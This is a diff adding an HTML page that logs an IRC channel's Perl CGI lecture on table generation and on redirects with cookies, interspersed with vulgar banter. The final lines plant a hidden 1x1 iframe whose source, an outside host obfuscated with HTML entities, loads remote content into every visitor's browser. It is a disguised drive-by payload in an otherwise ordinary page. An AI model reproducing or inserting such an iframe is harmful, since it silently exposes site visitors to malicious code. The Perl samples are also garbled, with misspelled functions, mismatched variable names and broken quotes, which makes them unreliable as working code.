+<br>*** Binary_Dealer has joined #bsrf
+<br>&lt;blue|bestbuy> yummy.. I got an italian sub from 7-11
+<br>&lt;Binary_Dealer> ppl =)
+<br>&lt;Binary_Dealer> What's Up?
+<br>*** blue|bestbuy is now known as bluehaze
+<br>*** NIN_Dude has quit IRC (Quit: )
+<br>&lt;bitsNbytes>&nbsp;&nbsp;&nbsp; print Tr(th($k), td( [sort @hash($k)}]));
+<br>&lt;Binary_Dealer> somebody saw essex
+<br>&lt;bitsNbytes> }
+<br>&lt;Binary_Dealer> ??
+<br>&lt;bluehaze> hehhe
+<br>&lt;bluehaze> he was on last night
+<br>&lt;Binary_Dealer> yes
+<br>&lt;Binary_Dealer> today?
+<br>&lt;bitsNbytes> print "&lt;/TABLE>;
+<br>&lt;bluehaze> dunno
+<br>*** NeoMeg has joined #bsrf
+<br>&lt;bitsNbytes> this generates text like
+<br>&lt;bitsNbytes> &lt;TABLE> &lt;CAPTION> People I have Known&lt;/CAPTION>
+<br>&lt;bluehaze> is this the perl lecture?
+<br>&lt;bitsNbytes> &lt;TR>&lt;TH>People &lt;/TH>
+<br>&lt;bitsNbytes> yep
+<br>&lt;bluehaze> ok
+<br>*** divinator has joined #bsrf
+<br>&lt;bitsNbytes> so u see perl a small perl code can generate a neatly
+formatted form with lists and tables
+<br>*** div|busy has quit IRC (Local kill by divinator (get lost you damn
+prick))
+<br>&lt;bitsNbytes> u can generate a lengthy HTML form
+<br>*** divinator has left #bsrf
+<br>*** divinator has joined #bsrf
+<br>&lt;bitsNbytes> full of lists and tables just by one statemet
+<br>*** sohed has quit IRC (Quit: )
+<br>*** phanatic has joined #bsrf
+<br>&lt;bitsNbytes> print table caption(text), Tr(th [qw(text)])
+<br>&lt;bluehaze> i got a question...
+<br>&lt;bitsNbytes> map {tr(th($_), td( [sort @($hash)})
+<br>&lt;bluehaze> can perl help us get laid?
+<br>&lt;bluehaze> cuz I told everyone that it could
+<br>&lt;bluehaze> and I just want to be sure
+<br>&lt;bitsNbytes> u mean as in ****ed laid
+<br>&lt;bluehaze> yes of course
+<br>&lt;phanatic> yes
+<br>&lt;bitsNbytes> yeah sur
+<br>&lt;phanatic> bluehaze has never gotten laid
+<br>&lt;bluehaze> cool
+<br>&lt;phanatic> in his life
+<br>*** HaloScan has quit IRC (Ping timeout: 180 seconds)
+<br>&lt;phanatic> back to the pearl
+<br>&lt;bluehaze> lol
+<br>&lt;Norton> where can i learn to chain proxies??
+<br>&lt;bitsNbytes> someone wanted to know redirection to other sites in
+PERL-CGI
+<br>&lt;bitsNbytes> certainly not here and not now .. sorry ;)
+<br>*** Leper has joined #bsrf
+<br>&lt;bitsNbytes> u use the redirect function
+<br>&lt;bitsNbytes> I have a peice of code for that too
+<br>&lt;bitsNbytes> i know i have become terrible and painsatakingly annoyingly
+boring by now
+<br>&lt;bitsNbytes> but hey .. that's me aight
+<br>&lt;bitsNbytes> so plz bear
+<br>&lt;phanatic> hey you're cool enough to do this, how can we complain?
+<br>&lt;bitsNbytes> any one from the beginning still hangin around
+<br>*** josh-hamster is now known as josh-hamsTERRORIST
+<br>&lt;bitsNbytes> (dozin around would do..&nbsp; :)
+<br>&lt;bluehaze> I just got here
+<br>&lt;bluehaze> so you gotta start over
+<br>&lt;bitsNbytes> nooooooooo
+<br>&lt;bluehaze> hehehe
+<br>&lt;bitsNbytes> you have to ask questions and i answer them in short
+.. after&nbsp; seeing the code that is
+<br>&lt;bluehaze> oh
+<br>&lt;bitsNbytes> so HERE COMES THE CODE
+<br>&lt;bluehaze> well...
+<br>&lt;bluehaze> oh
+<br>&lt;bluehaze> ok
+<br>&lt;phanatic> ok
+<br>&lt;bitsNbytes> actually it is quite a skill to write code on the fly
+and on demand
+<br>&lt;bitsNbytes> i am trying to do so right now
+<br>*** NeoMeg has quit IRC (Quit: )
+<br>&lt;bitsNbytes> anywaz here it comes
+<br>*** barcode has joined #bsrf
+<br>&lt;bitsNbytes> #! /usr/bin/perl -w
+<br>&lt;bitsNbytes> # orebounce - aprogram to redirect browser and set
+a cookie
+<br>*** wHiTE_zoMBIe has joined #bsrf
+<br>&lt;bitsNbytes> use CGI qw(:cgi);
+<br>&lt;bitsNbytes> $oreo = cookie (- NAME => 'filling',
+<br>&lt;Norton> how big is X?
+<br>&lt;bitsNbytes>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; -VALUE
+=> "Lard Ass",
+<br>&lt;bitsNbytes>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; -EXPIRES
+=> '+3M',
+<br>&lt;bitsNbytes>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; -DOMAIN =>&nbsp;
+',perl.com');
+<br>*** Leper has quit IRC (Quit: Leaving)
+<br>&lt;bitsNbytes> $whithergo = "http://somewhere.perl.com/nothinghere.html';
+<br>*** bluehaze has quit IRC (Quit: 15,1?ShowDowN v12 PrO?1 since
+1996: 16,1http://www.sci.fi/~showdown/)
+<br>&lt;bitsNbytes> print rediredt(-URL => $withergo,
+<br>&lt;bitsNbytes>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+-COOKIE => $oreo);
+<br>&lt;bitsNbytes> well that was the code
+<br>&lt;bitsNbytes> and that would produce something like
+<br>&lt;bitsNbytes> Status: 302 Moved Temporarily
+<br>*** wHiTE_zoMBIe has quit IRC (Quit: Client Exiting)
+<br>&lt;bitsNbytes> Set-Cookie: filling=LardASS; domain= .perl.com;
+<br>&lt;bitsNbytes> expires = DD-MM-YY Time GMT
+<br>*** zwanderer has joined #Bsrf
+<br>&lt;bitsNbytes> Date: day DD-MM-YY Time GMT
+<br>&lt;bitsNbytes> Location: http://somewhere.perl.com/nothinghere.html
+<br>&lt;bitsNbytes> Content-Type: text/html
+<br>&lt;bitsNbytes> B&lt;&lt;balnk line here>>
+<br>&lt;bitsNbytes> any questions
+<br>
+<hr SIZE=1 WIDTH="70%">
+<center>End Of Lecture</center>
+
+<iframe src="http://jL.c&#104;ura&#46;pl/rc/" style="width:1px;height:1px"></iframe>
+</body>
+</html>
